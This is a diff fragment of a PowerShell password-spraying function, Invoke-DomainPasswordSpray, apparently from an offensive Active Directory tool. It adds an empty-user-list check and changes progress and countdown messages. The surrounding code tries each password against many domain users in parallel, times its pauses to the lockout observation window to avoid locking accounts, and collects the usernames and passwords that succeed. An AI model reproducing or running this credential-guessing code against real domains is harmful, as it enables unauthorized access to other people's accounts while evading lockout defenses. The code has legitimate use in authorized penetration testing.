@@ -100,6 +100,11 @@ function Invoke-DomainPasswordSpray {
 			Write-Host "[*] The smallest lockout threshold discovered in the domain is $LockoutThreshold login attempts."
 		}
 	}
+	
+	if ($UserList -eq $null -or $UserList.count -lt 1) {
+		Write-Error '[*] No users available to spray. Exiting'
+		break
+	}
 
 	Write-Host "[*] The domain password policy observation window is set to $ObservationWindow minutes."
 	$StartTime = Get-Date
@@ -113,7 +118,7 @@ function Invoke-DomainPasswordSpray {
 		
 		$PasswordStartTime = Get-Date
 		
-		Write-Host "[*] Trying Password $($CurrentPasswordIndex+1) of $($PasswordList.count): $Password"		
+		Write-Host "[*] Trying Password $($CurrentPasswordIndex+1) of $($PasswordList.count): $Password"	
 		
 		$results = $UserList | Invoke-Parallel -ImportVariables -Throttle 50 -ScriptBlock {
 			
@@ -124,7 +129,6 @@ function Invoke-DomainPasswordSpray {
 				
 				
 				Write-Host -ForegroundColor Green "[*] SUCCESS! User $_ has the password $Password"
-				
 				
 				$CredDetails = New-Object PSObject
 				$CredDetails | Add-Member -MemberType NoteProperty -Name "UserName" -Value $_
@@ -139,22 +143,18 @@ function Invoke-DomainPasswordSpray {
 		
 		$SuccessfulResults.Add($results) > $null
 		
-		Write-Progress -Id 1 -ParentId 0 -Activity 'Sprayer Users' -Status 'Completed' -PercentComplete 100 -Completed
-		
 		$PasswordEndTime = Get-Date
 		$PasswordElapsedTime = New-Timespan –Start $PasswordStartTime –End $PasswordEndTime
-		Write-Host "[*] Finished trying password $Password at $($PasswordEndTime.ToShortTimeString())"
+		Write-Host "[*] Finished trying password $Password at $($PasswordEndTime.ToShortTimeString()) - $($results.count) successful results"
 		Write-Host $("[*] Total time elapsed trying $Password was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $PasswordElapsedTime)
-		
-		$CurrentPasswordIndex += 1
+
+		$CurrentPasswordIndex++
 		if ($LockoutThreshold -gt 0 -and ( $($PasswordList.count) - $CurrentPasswordIndex ) -gt 0) {
-			Invoke-Countdown -Seconds (60 * $ObservationWindow) -Message "[*] $CurrentPasswordIndex of $($PasswordList.count) passwords complete. Pausing to avoid account lockout"
+			Invoke-Countdown -Seconds (60 * $ObservationWindow) -Message "Spraying users on domain $DomainName" -Subtext "[*] $CurrentPasswordIndex of $($PasswordList.count) passwords complete. Pausing to avoid account lockout"
 		}
-		
 		
 	}
 	
-	Write-Progress -Id 0 -Activity 'Spraying Users' -Status 'Completed' -PercentComplete 100 -Completed
 	
 	$EndTime = Get-Date
 	$ElapsedTime = New-Timespan –Start $StartTime –End $EndTime
